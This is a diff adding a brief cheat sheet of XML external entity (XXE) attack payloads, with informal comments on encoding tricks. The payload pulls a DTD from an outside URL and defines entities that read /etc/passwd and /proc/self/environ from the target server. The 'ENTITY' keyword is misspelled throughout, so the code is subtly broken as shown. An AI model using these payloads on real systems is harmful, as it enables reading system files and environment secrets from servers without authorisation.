@@ -1,0 +1,19 @@
+# note that you can in the url nest again to double or triple encode.
+# note that the "%" means that you can only include your shit within the DOCTYPE
+# not having it means you can reference it from anywhere
+# note that sometimes you need to html encode our xml.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss[
+  <!ENTITIY % dtd SYSTEM "http://url_to_include_file">%dtd;
+]>
+<rss>
+&file;
+</rss>
+
+
+@ url
+
+<!ENTITIY file SYSTEM "file:///etc/passwd">
+or
+<!ENTITIY file SYSTEM "file:///proc/self/environ">
